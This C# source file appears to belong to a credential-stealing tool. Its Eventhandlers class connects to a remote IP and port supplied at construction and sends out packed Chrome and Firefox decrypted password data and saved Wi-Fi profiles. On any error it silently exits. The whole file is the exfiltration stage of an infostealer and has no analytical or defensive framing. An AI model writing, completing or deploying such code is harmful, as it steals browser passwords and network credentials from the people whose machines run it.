using System;
using System.Collections.Generic;
using PS03.Network.Transmit;
using PS03.PasswordOps.ChromeDecrypt;
using PS03.PasswordOps.FirefoxDecrypt.Models;
using PS03.PasswordOps.WiPS.Models;

namespace PS03.PasswordOps
{
    public class Eventhandlers
    {
        private readonly ChromePacker cpack = new ChromePacker();
        private readonly FirefoxPakcer fpack = new FirefoxPakcer();
        private readonly WifiPacker wpack = new WifiPacker();

        public RTransLink rtl;

        public Eventhandlers(string ip, int port)
        {
            rtl = new RTransLink(ip, port);
        }
        public void HandleWiFiProfileReady(List<Profile> profiles)
        {
            foreach (var profile in profiles)
            {
                try
                {
                    rtl.Send(wpack.Pack(profile));
                }
                catch (Exception)
                {
                    Environment.Exit(0);
                }
            }
        }

        public void HandleChromeDataReady(List<CPProfile> profiles)
        {
            foreach (var profile in profiles)
            {
                try
                {
                    rtl.Send(cpack.Pack(profile));
                }
                catch (Exception)
                {
                    Environment.Exit(0);
                }
            }
        }


        public void HandleFirefoxDataReady(List<FFData> profiles)
        {
            foreach (var profile in profiles)
            {
                try
                {
                    rtl.Send(fpack.Pack(profile));
                }
                catch (Exception)
                {
                    Environment.Exit(0);
                }
            }
        }
    }
}